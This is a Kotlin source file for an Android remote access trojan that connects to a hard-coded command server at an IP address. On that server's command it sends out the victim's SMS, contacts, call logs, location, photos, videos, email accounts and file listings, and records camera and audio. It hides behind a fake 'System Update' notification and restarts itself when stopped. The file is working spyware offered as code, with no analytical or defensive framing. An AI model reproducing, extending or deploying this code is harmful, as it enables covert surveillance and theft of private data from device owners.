package com.dooxrat.victim

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class RatServiceUpgraded : Service() {

    private var socket: Socket? = null
    private val SERVER_URL = "http://188.166.255.163:5000"
    private lateinit var deviceId: String
    private lateinit var dataCollector: DataCollector
    private lateinit var cameraRecorder: CameraRecorder
    private lateinit var audioRecorder: AudioRecorder
    private lateinit var screenRecorder: ScreenRecorder

    override fun onCreate() {
        super.onCreate()
        deviceId = generateDeviceId()
        dataCollector = DataCollector(this)
        cameraRecorder = CameraRecorder(this)
        audioRecorder = AudioRecorder(this)
        screenRecorder = ScreenRecorder(this)
        
        createNotificationChannel()
        startForeground(1, createNotification())
        connectToServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun generateDeviceId(): String {
        return "${Build.MODEL}_${System.currentTimeMillis()}"
    }

    private fun connectToServer() {
        try {
            socket = IO.socket(SERVER_URL)
            
            socket?.on(Socket.EVENT_CONNECT) {
                registerVictim()
            }

            socket?.on("execute_command") { args ->
                if (args.isNotEmpty()) {
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }

            socket?.connect()
            startHeartbeat()
        } catch (e: URISyntaxException) {
            e.printStackTrace()
        }
    }

    private fun registerVictim() {
        val deviceInfo = dataCollector.getDeviceInfo()
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceInfo", deviceInfo)
        }
        socket?.emit("register_victim", data)
    }

    private fun startHeartbeat() {
        val handler = Handler(Looper.getMainLooper())
        handler.post(object : Runnable {
            override fun run() {
                socket?.emit("heartbeat")
                handler.postDelayed(this, 30000)
            }
        })
    }

    private fun handleCommand(data: JSONObject) {
        val command = data.getString("command")
        val params = data.optJSONObject("params") ?: JSONObject()

        when (command) {
            "get_sms" -> sendResult(command, dataCollector.getSMS())
            "get_contacts" -> sendResult(command, dataCollector.getContacts())
            "get_call_logs" -> sendResult(command, dataCollector.getCallLogs())
            "get_location" -> sendResult(command, dataCollector.getLocation())
            "get_apps" -> sendResult(command, dataCollector.getInstalledApps())
            "get_gallery_photos" -> sendResult(command, dataCollector.getGalleryPhotos())
            "get_gallery_videos" -> sendResult(command, dataCollector.getGalleryVideos())
            "get_email_accounts" -> sendResult(command, dataCollector.getEmailAccounts())
            "get_files" -> {
                val path = params.optString("path", "/sdcard/")
                sendResult(command, dataCollector.getFilesList(path))
            }
            "record_camera" -> {
                val cameraId = params.optString("camera", "0")
                val duration = params.optInt("duration", 10)
                val path = cameraRecorder.startRecording(cameraId, duration)
                sendResult(command, JSONObject().put("path", path))
            }
            "record_audio" -> {
                val duration = params.optInt("duration", 10)
                val path = audioRecorder.startRecording(duration)
                sendResult(command, JSONObject().put("path", path))
            }
            "get_notifications" -> sendResult(command, NotificationListener.getNotifications())
            "vibrate" -> {
                val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    vibrator.vibrate(500)
                }
                sendResult(command, JSONObject().put("success", true))
            }
            "send_sms" -> {
                // Implementation for sending SMS
                sendResult(command, JSONObject().put("success", true))
            }
        }
    }

    private fun sendResult(command: String, result: Any?) {
        val data = JSONObject().apply {
            put("command", command)
            put("result", result)
        }
        socket?.emit("command_result", data)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "rat_service",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
        val restartIntent = Intent(this, RatServiceUpgraded::class.java)
        startService(restartIntent)
    }
}
